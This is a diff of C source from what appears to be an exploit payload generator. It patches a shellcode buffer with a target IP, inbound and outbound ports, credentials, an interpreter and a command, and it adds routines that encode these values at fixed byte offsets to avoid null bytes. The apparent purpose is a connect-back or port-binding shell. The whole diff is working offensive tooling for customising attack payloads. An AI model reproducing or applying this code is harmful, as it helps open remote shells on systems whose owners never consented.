@@ -86,69 +86,78 @@ void set_interpreter(char *shellcode, char *_interpreter)
 }
 
 //
-void set_script(char *shellcode, char *_cmd, char *file)
+void set_script(char *shellcode, char *_cmd)
 {
     char *ptr = NULL;
     char *cmd = _cmd;
     int cmd_len = 0;
 
-    if(!cmd && !file) cmd = "echo test";
+    if(!cmd) cmd = "echo test";
     if(!(ptr = index(shellcode, script_mark))) mark_not_found("script");
 
-    if(cmd)
-    {
-        cmd_len = strlen(cmd);
+    cmd_len = strlen(cmd);
 
-        payload_len += cmd_len;
-        if(!realloc(shellcode, payload_len+1)) exit(-1);
+    payload_len += cmd_len;
+    if(!realloc(shellcode, payload_len+1)) exit(-1);
 
-        strncpy(ptr, cmd, cmd_len);
-        *(ptr + cmd_len) = '\0';
+    strncpy(ptr, cmd, cmd_len);
+    *(ptr + cmd_len) = '\0';
+}
+
+// Russell Sanford - xort@tty64.org
+int find_safe_offset(int INT_A) {
+
+    int INT_B=0;
+    do {
+        INT_A -= 0x01010101;    INT_B += 0x01010101;
     }
-    else if(file)
-    {
-        FILE *script_file = NULL;
-        long script_len = 0;
-        int i;
+    while ( ((INT_A & 0x000000ff) == 0) ||
+            ((INT_A & 0x0000ff00) == 0) ||
+            ((INT_A & 0x00ff0000) == 0) ||
+            ((INT_A & 0xff000000) == 0) );
 
-        if(!(script_file = fopen(file, "r"))) {
-            perror("Error opening script file");
-            exit(-1);
-        }
+    return INT_B;
+}
 
-        fseek(script_file, 0L, SEEK_END);
-        script_len = ftell(script_file);
+// Russell Sanford - xort@tty64.org
+void patchcode(char *shellcode, uint16_t PORT_IN, uint32_t IP, uint16_t PORT_OUT) {
 
-        payload_len += script_len;
-        if(!realloc(shellcode, payload_len+1)) exit(-1);
+    uint16_t PORT_IN_A = PORT_IN;
+    uint16_t PORT_IN_B = find_safe_offset(PORT_IN_A);
 
-        rewind(script_file);
+    int IP_A = IP;
+    int IP_B = find_safe_offset(IP_A);
 
-        char *foo = index(shellcode, script_mark);
+    int PORT_OUT_A = PORT_OUT;
+    int PORT_OUT_B = find_safe_offset(PORT_OUT_A);
 
-        while(!feof(script_file)) {
-            ptr[0] = fgetc(script_file);
-            ptr++;
-            ptr[0] = '\0';
-            puts(foo);
-        }
+    *(int *)&shellcode[134] = (PORT_IN_A - PORT_IN_B);
+    *(int *)&shellcode[141] = PORT_IN_B;
 
-        fclose(script_file);
-    }
+    *(int *)&shellcode[205] = (IP_A - IP_B);
+    *(int *)&shellcode[212] = IP_B;
+
+    *(int *)&shellcode[217] = (PORT_OUT_A - PORT_OUT_B);
+    *(int *)&shellcode[224] = PORT_OUT_B;
+
 }
 
 //
 void personalize_shellcode(void)
 {
     //printf("[DBG] Payload before personalization:\n%s\n", sh_buffer);
-    if(args.my_ip) set_ip(sh_buffer, args.my_ip);
-    if(args.my_port) set_port(sh_buffer, args.my_port);
-    if(args.my_username) set_username(sh_buffer, args.my_username);
-    if(args.my_password) set_password(sh_buffer, args.my_password);
-    if(args.payload_index == 5)
-    {
+    if( args.payload_index != 4 &&  args.payload_index != 5) {
+        if(args.my_ip) set_ip(sh_buffer, args.my_ip);
+        if(args.my_port) set_port(sh_buffer, args.my_port);
+        if(args.my_username) set_username(sh_buffer, args.my_username);
+        if(args.my_password) set_password(sh_buffer, args.my_password);
+    }
+    else if(args.payload_index == 4) {
+        patchcode(sh_buffer, args.my_port, args.my_ip, args.my_port2);
+    }
+    else if(args.payload_index == 5) {
      set_interpreter(sh_buffer, args.interpreter);
-     set_script(sh_buffer, args.script_code, args.script_file);
+     set_script(sh_buffer, args.script_code);
     }
     //printf("[DBG] Payload after personalization:\n%s\n", sh_buffer);
 }
